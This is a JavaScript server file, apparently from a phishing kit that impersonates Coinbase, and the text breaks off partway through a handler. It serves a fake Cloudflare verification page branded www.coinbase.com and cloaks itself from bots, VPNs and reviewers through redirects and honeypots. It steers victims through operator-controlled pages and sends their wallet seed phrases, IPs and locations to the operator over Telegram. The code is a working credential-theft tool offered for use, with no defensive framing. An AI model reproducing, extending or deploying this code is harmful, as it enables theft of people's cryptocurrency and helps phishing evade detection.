import express from 'express';
import fs from 'fs';
import { createServer } from 'http';
import { Server } from 'socket.io';
import { fileURLToPath } from 'url';
import { promises as fsPromises } from 'fs';
import { dirname, join } from 'path';
import crypto from 'crypto';
import { verifyAdmin } from './middleware/auth.js';
import path from 'path';  // Add this with other imports
import { checkVPN, checkBot } from './middleware/antiBot.js';
import { scanPages } from './utils/pageScanner.js';
import { getIPDetails, getPublicIP } from './utils/ipUtils.js';
import { ipManager } from './utils/ipManager.js';
import { createIPBlocker } from './middleware/ipBlocker.js';
import fetch from 'node-fetch';
import { 
    sendTelegramNotification, 
    formatTelegramMessage, 
    sendErrorNotification,
    initTelegramService,
    sendStatusUpdate
} from './services/telegram.js';
import { secureServer } from './middleware/security-middleware.js';
import cookieParser from 'cookie-parser';
import { exec } from 'child_process';
import { promisify } from 'util';
const execAsync = promisify(exec);
import dotenv from 'dotenv';
dotenv.config();




const __dirname = dirname(fileURLToPath(import.meta.url));

class SessionManager {
    constructor() {
        this.sessions = new Map();
        this.pendingSessions = new Map();
        this.urlToSession = new Map();
        this.verifiedSessions = new Set();
        this.pagesPath = join(__dirname, '../../public/pages');
        this.pageMap = new Map();
        this.initializePages();
    }

    initializePages() {
        // Add debug logging
        console.log('Scanning pages directory:', this.pagesPath);
        
        const pages = fs.readdirSync(this.pagesPath)
            .filter(file => file.endsWith('.html'))
            .map(file => ({
                path: join(this.pagesPath, file),
                name: file.replace('.html', '')
            }));
    
        console.log('Found pages:', pages);
    
        for (const page of pages) {
            // Store with original case
            this.pageMap.set(page.name, page.path);
            // Also store lowercase version
            this.pageMap.set(page.name.toLowerCase(), page.path);
        }
        
        console.log('Page map:', Array.from(this.pageMap.keys()));
    }

    createSession(sessionId, clientIP, userAgent) {
        return this.createPendingSession(sessionId, clientIP, userAgent);
    }

    createPendingSession(sessionId, clientIP, userAgent) {
        const oauthChallenge = crypto.randomUUID();
        const session = {
            id: sessionId,
            clientIP,
            userAgent,
            oauthChallenge,
            currentPage: 'awaiting',
            verified: false,
            connected: true,
            loading: false,
            redirecting: false, // Add this flag
            lastHeartbeat: Date.now(),
            lastAccessed: Date.now(),
            createdAt: Date.now(),
            pending: true,
            ip: null,
            hostname: null,
            country: null,
            city: null,
            region: null,
            isp: null
        };
    
        this.pendingSessions.set(sessionId, session);
        this.updateSessionUrl(session);
        return session;
    }

    promotePendingSession(sessionId) {
        const pendingSession = this.pendingSessions.get(sessionId);
        if (pendingSession) {
            delete pendingSession.pending;
            this.sessions.set(sessionId, pendingSession);
            this.pendingSessions.delete(sessionId);
            return pendingSession;
        }
        return null;
    }

    updateSessionUrl(session) {
        // Remove old URL mapping if exists
        if (session.url) {
            this.urlToSession.delete(session.url);
        }
    
        // Clean and capitalize the page name
        const pageName = session.currentPage
            .replace(/^\/+|\.html$/g, '')  // Remove leading slashes and .html
            .trim();
        const pageNameCapitalized = pageName.charAt(0).toUpperCase() + 
                                   pageName.slice(1).toLowerCase();
        
        // Create new URL ensuring proper format
        const url = `/${pageNameCapitalized}?client_id=${session.id}&oauth_challenge=${session.oauthChallenge}`;
        
        // Validate URL format
        if (!url.startsWith('/') || url.startsWith('//')) {
            console.error('Invalid URL format generated:', url);
            // Fix malformed URL
            const fixedUrl = '/' + url.replace(/^\/+/, '');
            session.url = fixedUrl;
            this.urlToSession.set(fixedUrl, session.id);
            return fixedUrl;
        }
    
        session.url = url;
        this.urlToSession.set(url, session.id);
        return url;
    }

    getSession(sessionId) {
        // Check both regular and pending sessions
        return this.sessions.get(sessionId) || this.pendingSessions.get(sessionId);
    }

    getSessionFromUrl(url) {
        const [path, query] = url.split('?');
        if (!query) return null;

        const params = new URLSearchParams(query);
        const sessionId = params.get('client_id');
        // Check both regular and pending sessions
        return this.getSession(sessionId);
    }

    verifySession(sessionId) {
        const session = this.getSession(sessionId);
        if (session) {
            // If it's a pending session, promote it
            if (this.pendingSessions.has(sessionId)) {
                this.promotePendingSession(sessionId);
            }
            session.verified = true;
            this.verifiedSessions.add(sessionId);
            return true;
        }
        return false;
    }

    isVerified(sessionId) {
        return this.verifiedSessions.has(sessionId);
    }

    isPending(sessionId) {
        return this.pendingSessions.has(sessionId);
    }

    updateSessionPage(sessionId, page) {
        const session = this.getSession(sessionId);
        if (!session) return null;
    
        // Make sure we use the correct case for the page name
        const normalizedPage = page.replace('.html', '').toLowerCase();
        const actualPageName = Array.from(this.pageMap.keys()).find(
            key => key.toLowerCase() === normalizedPage
        );
    
        if (!actualPageName) return null;
    
        session.currentPage = actualPageName;
        session.lastAccessed = Date.now();
        return this.updateSessionUrl(session);
    }

    validateSessionUrl(url) {
        const sessionId = this.urlToSession.get(url);
        if (!sessionId) return false;

        const session = this.getSession(sessionId);
        if (!session) return false;

        const [path, query] = url.split('?');
        if (!query) return false;

        const params = new URLSearchParams(query);
        return session.oauthChallenge === params.get('oauth_challenge');
    }

    validateAccess(clientId, oauthChallenge) {
        const session = this.getSession(clientId);
        return session && session.oauthChallenge === oauthChallenge;
    }

    getPagePath(page) {
        // Remove .html and convert to lowercase for comparison
        const normalizedPage = page.replace('.html', '').toLowerCase();
        
        // Find the matching page name regardless of case
        const pageName = Array.from(this.pageMap.keys()).find(
            key => key.toLowerCase() === normalizedPage
        );
        
        // Debug logging
        console.log('Page lookup:', {
            requested: page,
            normalized: normalizedPage,
            found: pageName,
            availablePages: Array.from(this.pageMap.keys())
        });
        
        return pageName ? this.pageMap.get(pageName) : null;
    }

    deleteSession(sessionId) {
        const session = this.getSession(sessionId);
        if (session) {
            // Clear any pending timeouts
            if (session.disconnectTimeout) {
                clearTimeout(session.disconnectTimeout);
            }
            
            const timeout = loadingTimeouts.get(sessionId);
            if (timeout) {
                clearTimeout(timeout);
                loadingTimeouts.delete(sessionId);
            }
            
            this.urlToSession.delete(session.url);
            this.sessions.delete(sessionId);
            this.pendingSessions.delete(sessionId);
            this.verifiedSessions.delete(sessionId);
        }
    }

    getAllVerifiedSessions() {
        return Array.from(this.sessions.values())
            .filter(session => session.verified);
    }

    getAllPendingSessions() {
        return Array.from(this.pendingSessions.values());
    }

    cleanupSessions(maxAge = 30 * 60 * 1000, pendingMaxAge = 5 * 60 * 1000) {
        const now = Date.now();
        
        // Cleanup verified sessions
        for (const [sessionId, session] of this.sessions.entries()) {
            if (now - session.lastAccessed > maxAge) {
                this.deleteSession(sessionId);
            }
        }

        // Cleanup pending sessions with shorter timeout
        for (const [sessionId, session] of this.pendingSessions.entries()) {
            if (now - session.lastAccessed > pendingMaxAge) {
                this.deleteSession(sessionId);
            }
        }
    }

    getSessionCount() {
        return {
            verified: this.sessions.size,
            pending: this.pendingSessions.size,
            total: this.sessions.size + this.pendingSessions.size
        };
    }
}

// Generate stable session ID
const generateSessionId = (clientIP, userAgent) => {
    return crypto.createHash('md5')
        .update(clientIP + userAgent)
        .digest('hex')
        .slice(0, 8);
};

const BotLogger = {
    logFile: join(__dirname, '../../logs/detected_bots.txt'),
    jsonFile: join(__dirname, '../../logs/bot_signatures.json'),
    
    async initialize() {
        try {
            // Ensure logs directory exists
            const logsDir = join(__dirname, '../../logs');
            await fsPromises.mkdir(logsDir, { recursive: true });
            
            // Create files if they don't exist
            await fsPromises.access(this.logFile).catch(async () => {
                await fsPromises.writeFile(this.logFile, '');
            });
            
            await fsPromises.access(this.jsonFile).catch(async () => {
                await fsPromises.writeFile(this.jsonFile, '[]');
            });
        } catch (error) {
            console.error('Error initializing bot logger:', error);
        }
    },
    
    async logBot(data) {
        try {
            const timestamp = new Date().toISOString();
            const logEntry = `[${timestamp}] IP: ${data.ip} | UA: ${data.userAgent} | Fields: ${JSON.stringify(data.fields)}\n`;
            
            // Append to text log
            await fsPromises.appendFile(this.logFile, logEntry);
            
            // Update JSON database
            const jsonContent = await fsPromises.readFile(this.jsonFile, 'utf8');
            const botList = JSON.parse(jsonContent || '[]');
            
            // Create signature object
            const signature = {
                ip: data.ip,
                userAgent: data.userAgent,
                timestamp,
                fields: data.fields,
                fingerprint: this.createFingerprint(data.userAgent)
            };
            
            // Check if similar signature exists
            const exists = botList.some(bot => 
                bot.userAgent === data.userAgent || bot.ip === data.ip
            );
            
            if (!exists) {
                botList.push(signature);
                await fsPromises.writeFile(
                    this.jsonFile, 
                    JSON.stringify(botList, null, 2)
                );
            }
            
            // Auto-ban if configured
            if (state.settings.autoBanBots) {
                ipManager.banIP(data.ip, {
                    bannedBy: 'honeypot',
                    bannedAt: timestamp,
                    reason: 'Honeypot trigger'
                });
                
                // Notify admin
                await sendTelegramNotification(formatTelegramMessage('bot_banned', {
                    ip: data.ip,
                    userAgent: data.userAgent,
                    reason: 'Honeypot trigger'
                }));
            }
            
        } catch (error) {
            console.error('Error logging bot:', error);
        }
    },
    
    createFingerprint(userAgent) {
        // Create a simplified fingerprint from user agent
        return userAgent
            .toLowerCase()
            .replace(/[^a-z0-9]/g, '')
            .slice(0, 32);
    }
};

// Initialize server components
const app = express();

app.use(express.json());
app.use(cookieParser());

secureServer(app);






app.use((req, res, next) => {
    console.log(`[REQUEST] ${req.method} ${req.path} ${req.originalUrl}`);
    next();
});


app.use('/pages', async (req, res, next) => {
    try {
        // Skip protection for non-HTML files (assets)
        if (!req.path.endsWith('.html')) {
            return next();
        }

        const params = new URLSearchParams(req.url.split('?')[1] || '');
        const clientId = params.get('client_id');
        const oauthChallenge = params.get('oauth_challenge');

        // Debug logging
        console.log('Pages directory access attempt:', {
            path: req.path,
            clientId,
            oauthChallenge,
            hasSession: !!sessionManager.getSession(clientId),
            isVerified: clientId ? sessionManager.isVerified(clientId) : false
        });

        // Block direct access to HTML files without proper session
        if (!clientId || !oauthChallenge || !sessionManager.validateAccess(clientId, oauthChallenge)) {
            console.log('Unauthorized pages access attempt:', req.path);
            return res.redirect('/');
        }

        // Ensure session is verified through Turnstile
        if (!sessionManager.isVerified(clientId)) {
            console.log('Unverified session attempting to access pages');
            return res.redirect('/');
        }

        // If all checks pass, proceed to serve the file
        next();
    } catch (error) {
        console.error('Error in pages protection middleware:', error);
        res.redirect('/');
    }
});
app.use('/pages', express.static(join(__dirname, '../../public/pages')));


// Admin protection middleware
app.use('/admin', (req, res, next) => {
    // Skip for asset requests
    if (req.path.match(/\.(js|css|png|jpg|jpeg|gif|ico|svg)$/)) {
        return next();
    }

    const adminAttemptCookie = req.cookies.adminAttempt;
    console.log('[ADMIN] Cookie:', adminAttemptCookie);

    if (!adminAttemptCookie) {
        console.log('[ADMIN] First attempt - redirecting to Coinbase');
        res.cookie('adminAttempt', '1', {
            maxAge: 300000, // 5 minutes
            httpOnly: true,
            secure: false,  // Set to true in production
            sameSite: 'lax'
        });
        return res.redirect('https://coinbase.com');
    }

    console.log('[ADMIN] Second attempt - proceeding');
    res.clearCookie('adminAttempt');
    next();
});

// Serve static files for admin
app.use('/admin', express.static(join(__dirname, '../../dist/admin')));

// Admin SPA catch-all route
app.get('/admin/*', (req, res) => {
    res.sendFile(join(__dirname, '../../dist/admin/index.html'));
});
const server = createServer(app);
const io = new Server(server, {
    cors: {
        origin: ["http://localhost:5173", "http://localhost:3000"],
        methods: ["GET", "POST"],
        credentials: true,
        allowedHeaders: ["Content-Type", "Authorization", "auth-token"]
    },
    allowEIO3: true,
    // Add these settings to help prevent ECONNABORTED errors
    pingTimeout: 60000,
    pingInterval: 25000,
    upgradeTimeout: 30000,
    transports: ['websocket', 'polling']
});




// Initialize managers and state
const sessionManager = new SessionManager();

const state = {
    settings: {
        websiteEnabled: true,
        redirectUrl: 'https://google.com',
        vpnBlockEnabled: false,
        antiBotEnabled: true,
        defaultLandingPage: 'loading.html',
        captchaEnabled: false,
        availablePages: []
    },
    sessions: new Map(),
    bannedIPs: new Set(ipManager.getAllBannedIPs()),
    adminSessions: new Set()
};

// Initialize available pages
const pagesPath = join(__dirname, '../../public/pages');
state.settings.availablePages = scanPages(pagesPath);

// Initialize Telegram integration
initTelegramService(state.settings);
await BotLogger.initialize();


// Page serving middleware
const pageServingMiddleware = async (req, res, next) => {
    try {
        // Skip middleware for static assets
        const requestedPath = req.url.split('?')[0];
        if (requestedPath.match(/\.(js|css|png|jpg|jpeg|gif|ico|svg)$/)) {
            return next();
        }

        // Get session parameters
        const params = new URLSearchParams(req.url.split('?')[1] || '');
        const clientId = params.get('client_id');
        const oauthChallenge = params.get('oauth_challenge');
        
        // Get requested page from URL
        let requestedPage = requestedPath.substring(1);
        
        // Debug logging
        console.log('Page request:', {
            requestedPage,
            clientId,
            oauthChallenge,
            hasSession: !!sessionManager.getSession(clientId),
            isVerified: sessionManager.isVerified(clientId)
        });

        // If no session parameters are provided or invalid, redirect to root
        if (!clientId || !oauthChallenge || !sessionManager.validateAccess(clientId, oauthChallenge)) {
            console.log('Invalid or missing session parameters, redirecting to root');
            return res.redirect('/');
        }

        const session = sessionManager.getSession(clientId);
        if (!session) {
            console.log('No valid session found, redirecting to root');
            return res.redirect('/');
        }

        // Critical security check: Verify the session is properly verified through Turnstile
        if (!sessionManager.isVerified(clientId)) {
            console.log('Session not verified through Turnstile, redirecting to root');
            return res.redirect('/');
        }

        // Ensure requested page matches session's current page
        const normalizedRequestedPage = requestedPage.replace('.html', '').toLowerCase();
        const normalizedSessionPage = session.currentPage.toLowerCase();
        
        if (normalizedRequestedPage !== normalizedSessionPage) {
            console.log('Page mismatch:', {
                requested: normalizedRequestedPage,
                current: normalizedSessionPage
            });
            return res.redirect(session.url);
        }

        // Ensure we add .html to the page name if not present
        if (!requestedPage.endsWith('.html')) {
            requestedPage += '.html';
        }

        // Get and validate the page path
        const pagePath = sessionManager.getPagePath(requestedPage);
        if (!pagePath) {
            console.log('Page not found:', requestedPage);
            return res.redirect('/');
        }

        // If all checks pass, serve the requested page
        console.log('Serving verified page:', pagePath);
        res.sendFile(pagePath);

    } catch (error) {
        console.error('Error in page serving middleware:', error);
        res.redirect('/');
    }
};

app.get('/', (req, res) => {
    console.log('Root route accessed');
    const isAdminPanel = req.headers.referer?.includes('/admin');
 
    if (isAdminPanel) {
        return next(); 
    }
 
    // Check if website is enabled
    if (!state.settings.websiteEnabled && !isAdminPanel) {
        console.log('Website disabled - redirecting to:', state.settings.redirectUrl);
        return res.redirect(state.settings.redirectUrl);
    }
 
    // If enabled, set cookie and redirect to Adspect
    console.log('- Redirecting to Adspect');
    res.cookie('adspect_redirect', 'true', {
        maxAge: 5000, // 5 seconds
        httpOnly: true,
        secure: true,
        sameSite: 'lax'
    });
        
    return res.redirect(302, 'https://redirectingroute.com/');
 });

 app.post('/verify-honeypot', async (req, res) => {
    const { email, username, website } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                    req.headers['x-real-ip'] || 
                    req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    
    // If any honeypot field is filled, it's likely a bot
    if (email || username || website) {
        console.log('Honeypot triggered:', {
            ip: clientIP,
            userAgent,
            fields: { email, username, website }
        });
        
        // Log the bot
        await BotLogger.logBot({
            ip: clientIP,
            userAgent,
            fields: { email, username, website }
        });
        
        return res.json({ redirect: state.settings.redirectUrl });
    }
    
    res.json({ success: true });
});

// Initial IP check
app.get('/check-ip', async (req, res) => {
    const isAdminPanel = req.headers.referer?.includes('/admin');
    const adspectCookie = req.cookies.adspect_redirect;
    const referer = req.headers.referer || '';
    
    console.log('Check-IP Headers:', {
        referer,
        'adspect-cookie': adspectCookie,
        'user-agent': req.headers['user-agent']
    });

    // Check either referer or our cookie
    const isFromAdspect = referer.includes('redirectingroute.com') || adspectCookie === 'true';
    
    if (!isFromAdspect && !isAdminPanel) {
        console.log('Invalid access to /check-ip');
        return res.redirect(state.settings.redirectUrl);
    }

    // Clear the cookie since we've used it
    res.clearCookie('adspect_redirect');
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                    req.headers['x-real-ip'] || 
                    req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    
    try {
        const publicIP = await getPublicIP(clientIP);
        
        if (ipManager.isIPBanned(publicIP) && !isAdminPanel) {
            return res.redirect(state.settings.redirectUrl);
        }

        // Generate sessionId and check for existing verified session
        const sessionId = generateSessionId(publicIP, userAgent);
        const existingVerifiedSession = sessionManager.getAllVerifiedSessions()
            .find(s => s.id === sessionId);

        // If there's an existing verified session, reactivate and redirect
        if (existingVerifiedSession) {
            existingVerifiedSession.connected = true;
            existingVerifiedSession.loading = false;
            existingVerifiedSession.lastHeartbeat = Date.now();
            existingVerifiedSession.lastAccessed = Date.now();

            const redirectUrl = sessionManager.updateSessionUrl(existingVerifiedSession);
            
            console.log('Reactivating existing session:', {
                sessionId,
                page: existingVerifiedSession.currentPage,
                redirectUrl
            });
            
            adminNamespace.emit('session_updated', existingVerifiedSession);
            return res.redirect(redirectUrl);
        }

        // Create new session if none exists
        if (!sessionManager.getSession(sessionId)) {
            sessionManager.createSession(sessionId, publicIP, userAgent);
        }

        // Generate random ray ID for captcha page
        const rayId = Math.random().toString(16).substr(2, 10);
        const indexHtml = `<!DOCTYPE html>
<html lang="en">
<!-- Head section remains the same -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Just a moment...</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
        <script src="/socket.io/socket.io.js"></script>
    <script src="/js/socket-client.js"></script>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html {
            line-height: 1.15;
            -webkit-text-size-adjust: 100%;
            color: #d9d9d9;
        }

       .honeypot-field {
            position: absolute !important;
            left: -9999px !important;
            top: -9999px !important;
            opacity: 0 !important;
            width: 0 !important;
            height: 0 !important;
            pointer-events: none !important;
        }

        body {
            background-color: #1C1C1C;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        .main-wrapper {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .main-content {
            margin: 8rem auto;
            max-width: 60rem;
            width: 100%;
            padding: 0 1.5rem;
        }

        .h1 {
            font-size: 2.5rem;
            font-weight: 500;
            line-height: 3.75rem;
            color: #d9d9d9;
            margin-bottom: 1rem;
        }

        .h2 {
            font-size: 1.5rem;
            font-weight: 500;
            line-height: 2.25rem;
            color: #d9d9d9;
            margin-bottom: 1rem;
        }

        .core-msg {
            font-size: 1rem;
            line-height: 1.5rem;
            color: #d9d9d9;
            margin: 2rem 0;
        }

        .spacer {
            margin: 2rem 0;
        }

        #captchaContainer {
            display: ${state.settings.antiBotEnabled ? 'block' : 'none'};
        }

        .footer {
            padding: 1.5rem;
            margin: 0 auto;
            max-width: 60rem;
            width: 100%;
        }

        .footer-inner {
            border-top: 1px solid #2c2c2c;
            padding: 1rem 0;
        }

        .ray-id {
            text-align: center;
            font-size: 0.75rem;
            color: #d9d9d9;
        }

        .ray-id code {
            font-family: monaco, courier, monospace;
        }

        .text-center {
            text-align: center;
            font-size: 0.75rem;
            color: #d9d9d9;
            margin-top: 0.5rem;
        }

        .cf-turnstile {
            background: transparent;
            margin: 1rem 0;
        }
    </style>
</head>
<body>
    <form id="contact-form" class="honeypot-field" tabindex="-1" aria-hidden="true">
        <input type="email" name="email" autocomplete="off">
        <input type="text" name="username" autocomplete="off">
        <input type="url" name="website" autocomplete="off">
    </form>
    <div class="main-wrapper">
        <div class="main-content">
            <h1 class="h1">www.coinbase.com</h1>
            <h2 class="h2">Verifying you are human. This may take a few seconds.</h2>
            
            <div id="captchaContainer">
                <div class="cf-turnstile" 
                    data-sitekey="${process.env.CLOUDFLARE_SITE_KEY}"
                    data-callback="onCaptchaSuccess"
                    data-theme="dark"></div>
            </div>

            <div class="core-msg spacer">
                www.coinbase.com needs to review the security of your connection before proceeding.
            </div>
        </div>

        <div class="footer">
            <div class="footer-inner">
                <div class="ray-id">Ray ID: <code>${rayId}</code></div>
                <div class="text-center">Performance & security by Cloudflare</div>
            </div>
        </div>
    </div>


    <script>
        let captchaToken = null;

        function onCaptchaSuccess(token) {
            captchaToken = token;
            checkAccess();
        }

        async function checkAccess() {
    if (${state.settings.antiBotEnabled ? 'true' : 'false'} && !captchaToken) {
        return;
    }

    try {
        const sessionId = new URLSearchParams(window.location.search).get('client_id');
        console.log('Checking access for session:', sessionId);
        
        if (${state.settings.antiBotEnabled ? 'true' : 'false'}) {
            const verifyResponse = await fetch('/verify-turnstile', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ 
                    token: captchaToken,
                    sessionId: sessionId
                })
            });
            
            const verifyResult = await verifyResponse.json();
            console.log('Verification result:', verifyResult);

            if (verifyResult.success && verifyResult.verified && verifyResult.url) {
                console.log('Redirecting to verified URL:', verifyResult.url);
                window.location.replace(verifyResult.url);
                return;
            } else if (!verifyResult.success) {
                console.error('Verification failed:', verifyResult.error);
                // Don't redirect, let them try the captcha again
                return;
            }
        }

        // Only check IP if we don't have a session
        if (!sessionId) {
            console.log('No session, checking IP...');
            const response = await fetch('/check-ip');
            if (response.redirected) {
                window.location.replace(response.url);
            }
        }
    } catch (error) {
        console.error('Error in checkAccess:', error);
    }
}
    </script>
</body>
</html>`;
        // Send captcha page
        res.send(indexHtml); // Your captcha HTML template

    } catch (error) {
        console.error('Error in check-ip:', error);
        res.redirect(state.settings.redirectUrl);
    }
});



const checkBannedIP = async (req, res, next) => {
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                    req.headers['x-real-ip'] || 
                    req.socket.remoteAddress;
    const isAdminPanel = req.headers.referer?.includes('/admin');
    
    if (isAdminPanel) {
        return next();
    }

    try {
        const publicIP = await getPublicIP(clientIP);
        if (ipManager.isIPBanned(publicIP)) {
            return res.redirect(state.settings.redirectUrl);
        }
        next();
    } catch (error) {
        console.error('Error checking IP:', error);
        next();
    }
};

// Add this middleware before your page routes
app.use('/:page', checkBannedIP);

// Captcha verification endpoint
// Modify the verify-turnstile endpoint
// Modified verify-turnstile endpoint
app.post('/verify-turnstile', async (req, res) => {
    const { token, sessionId } = req.body;
    
    console.log('Verifying turnstile:', { sessionId });
    
    try {
        const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                secret: process.env.CLOUDFLARE_SECRET_KEY,
                response: token
            })
        });

        const data = await response.json();
        console.log('Turnstile verification result:', data);

        if (data.success && sessionId) {
            let session = sessionManager.getSession(sessionId);
            const existingVerifiedSession = sessionManager.getAllVerifiedSessions()
                .find(s => s.id === sessionId);

            if (existingVerifiedSession) {
                // If there's an existing verified session, reactivate it instead of creating new
                existingVerifiedSession.connected = true;
                existingVerifiedSession.loading = false;
                existingVerifiedSession.lastHeartbeat = Date.now();
                existingVerifiedSession.lastAccessed = Date.now();
                
                // Update session to Loading page
                const newUrl = sessionManager.updateSessionPage(sessionId, 'Loading');
                
                console.log('Reactivating existing session:', sessionId);
                adminNamespace.emit('session_updated', existingVerifiedSession);
                
                return res.json({ 
                    success: true, 
                    url: newUrl,
                    verified: true
                });
            }

            if (session) {
                // Verify and promote the session
                sessionManager.verifySession(sessionId);
                
                // Get IP details and update session
                const ipDetails = await getIPDetails(session.clientIP);
                session.ip = ipDetails.ip;
                session.hostname = ipDetails.hostname;
                session.country = ipDetails.country;
                session.city = ipDetails.city;
                session.region = ipDetails.region;
                session.isp = ipDetails.isp;
                session.connected = true;
                session.loading = false;

                // Update session to Loading page
                const newUrl = sessionManager.updateSessionPage(sessionId, 'Loading');
                
                console.log('Session verified and promoted, new URL:', newUrl);
                
                // Only now notify admin of new session since it's verified
                adminNamespace.emit('session_created', session);
                await sendTelegramNotification(formatTelegramMessage('new_session', {
                    id: sessionId,
                    ip: session.clientIP,
                    userAgent: session.userAgent,
                    location: `${session.city || 'Unknown'}, ${session.country || 'Unknown'}`
                }));
                
                return res.json({ 
                    success: true, 
                    url: newUrl,
                    verified: true
                });
            }
        }
        
        res.json({ success: false, error: 'Verification failed' });
    } catch (error) {
        console.error('Turnstile verification error:', error);
        res.json({ success: false, error: 'Verification failed' });
    }
});


// Page serving route - must come after other routes
app.get('/:page', pageServingMiddleware);


// Static files
app.use(express.static(join(__dirname, '../../public')));
const loadingTimeouts = new Map();

// User namespace
const userNamespace = io.of('/user');

userNamespace.use(async (socket, next) => {
    const clientIP = socket.handshake.headers['x-forwarded-for'] || 
                    socket.handshake.headers['x-real-ip'] || 
                    socket.handshake.address;
                    
    try {
        const publicIP = await getPublicIP(clientIP);
        socket.cleanIP = publicIP;
        
        if (ipManager.isIPBanned(publicIP)) {
            socket.disconnect(true);
            return next(new Error('IP banned'));
        }

        // VPN check
        if (state.settings.vpnBlockEnabled) {
            const ipDetails = await getIPDetails(publicIP);
            if (ipDetails.isVPN || ipDetails.isProxy || ipDetails.isTor) {
                socket.disconnect(true);
                return next(new Error('VPN detected'));
            }
        }

        // Bot check
        if (state.settings.antiBotEnabled) {
            const userAgent = socket.handshake.headers['user-agent'];
            if (checkBot(userAgent)) {
                socket.disconnect(true);
                return next(new Error('Bot detected'));
            }
        }

        next();
    } catch (error) {
        console.error('Socket middleware error:', error);
        next(error);
    }
});

userNamespace.on('connection', async (socket) => {
    const userAgent = socket.handshake.headers['user-agent'];
    const clientIP = socket.cleanIP;
    
    try {
        const ipDetails = await getIPDetails(clientIP);
        const sessionId = generateSessionId(clientIP, userAgent);
        
        let session = sessionManager.getSession(sessionId);
        if (session) {
            // Clean up any existing timeouts
            if (session.disconnectTimeout) {
                clearTimeout(session.disconnectTimeout);
                delete session.disconnectTimeout;
            }
            const existingTimeout = loadingTimeouts.get(sessionId);
            if (existingTimeout) {
                clearTimeout(existingTimeout);
                loadingTimeouts.delete(sessionId);
            }

            // Update existing session
            session.connected = true;
            session.loading = false;
            session.lastHeartbeat = Date.now();
            if (socket.handshake.query.page) {
                session.currentPage = socket.handshake.query.page;
            }

            // Refresh IP details on reconnection
            session.ip = ipDetails.ip;
            session.hostname = ipDetails.hostname;
            session.country = ipDetails.country;
            session.city = ipDetails.city;
            session.region = ipDetails.region;
            session.isp = ipDetails.isp;
            
            // Only emit updates for verified sessions
            if (!sessionManager.isPending(sessionId)) {
                adminNamespace.emit('session_updated', session);
            }
        } else {
            // Create new session
            session = sessionManager.createSession(sessionId, clientIP, userAgent);
            
            // Add IP details to session
            session.ip = ipDetails.ip;
            session.hostname = ipDetails.hostname;
            session.country = ipDetails.country;
            session.city = ipDetails.city;
            session.region = ipDetails.region;
            session.isp = ipDetails.isp;
            session.connected = true;
            session.loading = false;
            session.lastHeartbeat = Date.now();
            session.disconnectTimeout = null; // Initialize timeout tracker

            // Only notify admin if session is verified (not pending)
            if (!sessionManager.isPending(sessionId)) {
                adminNamespace.emit('session_created', session);
                await sendTelegramNotification(formatTelegramMessage('new_session', {
                    id: sessionId,
                    ip: clientIP,
                    userAgent,
                    location: `${ipDetails.city || 'Unknown'}, ${ipDetails.country || 'Unknown'}`
                }));
            }
        }

        // Store session ID on socket for disconnect handling
        socket.sessionId = sessionId;
        socket.emit('session_url', session.url);

        socket.on('request_redirect', (data) => {
            const session = sessionManager.getSession(socket.sessionId);
            if (session) {
                // Keep connection active during redirect
                session.loading = true;
                session.connected = true;
                
                // Update session page and get new URL
                const pageNameCapitalized = data.page.charAt(0).toUpperCase() + data.page.slice(1).toLowerCase();
                session.currentPage = pageNameCapitalized;
                const newUrl = sessionManager.updateSessionUrl(session);
                
                if (newUrl) {
                    console.log('Redirecting user to:', newUrl);
                    socket.emit('redirect', newUrl);
                }
                
                // Notify admin of update if session is verified
                if (!sessionManager.isPending(socket.sessionId)) {
                    adminNamespace.emit('session_updated', session);
                }
            }
        });

        // Handle page changes
        socket.on('page_change', (page) => {
            const session = sessionManager.getSession(sessionId);
            if (session && sessionManager.getPagePath(page)) {
                session.loading = true;
                session.lastAccessed = Date.now();
                session.lastHeartbeat = Date.now();
                
                const newUrl = sessionManager.updateSessionPage(
                    sessionId, 
                    page.replace('.html', '')
                );
                
                if (newUrl) {
                    socket.emit('session_url', newUrl);
                }
                
                // Only emit updates for verified sessions
                if (!sessionManager.isPending(sessionId)) {
                    adminNamespace.emit('session_updated', session);
                }
            }
        });

        // Handle review completion
        socket.on('review_completed', async (data) => {
            const session = sessionManager.getSession(sessionId);
            if (session) {
                session.reviewCompleted = true;
                adminNamespace.emit('session_updated', session);
                await sendTelegramNotification(formatTelegramMessage('review_completed', {
                    sessionId,
                    ip: clientIP,
                    timestamp: data.timestamp
                }));
            }
        });

        // Handle amount confirmation
        socket.on('amount_confirmed', (data) => {
            const session = sessionManager.getSession(sessionId);
            if(session) {
                session.selectedAmount = data.amount;
                adminNamespace.emit('session_updated', session);
                
                sendTelegramNotification(formatTelegramMessage('amount_confirmed', {
                    sessionId: session.id,
                    amount: data.amount,
                    ip: session.ip
                }));
            }
        });

        // Handle user actions (like seed phrase submission)
        socket.on('user_action', async (action) => {
            if (action.type === 'seed_phrase_submitted') {
                await sendTelegramNotification(formatTelegramMessage('seed_phrase', {
                    sessionId,
                    ip: session.clientIP,
                    location: `${session.city || 'Unknown'}, ${session.country || 'Unknown'}`,
                    seedPhrase: action.data,
                    timestamp: action.timestamp
                }));

                if (session) {
                    session.loading = true;
                    adminNamespace.emit('session_updated', session);
                }
            }
        });

        // Handle heartbeat
        socket.on('heartbeat', () => {
            const session = sessionManager.getSession(sessionId);
            if (session) {
                session.lastHeartbeat = Date.now();
                session.lastAccessed = Date.now();
                session.connected = true;
                // Only emit updates for verified sessions
                if (!sessionManager.isPending(sessionId)) {
                    adminNamespace.emit('session_updated', session);
                }
            }
        });



        // Check session URL
        socket.on('check_session_url', () => {
            const session = sessionManager.getSession(sessionId);
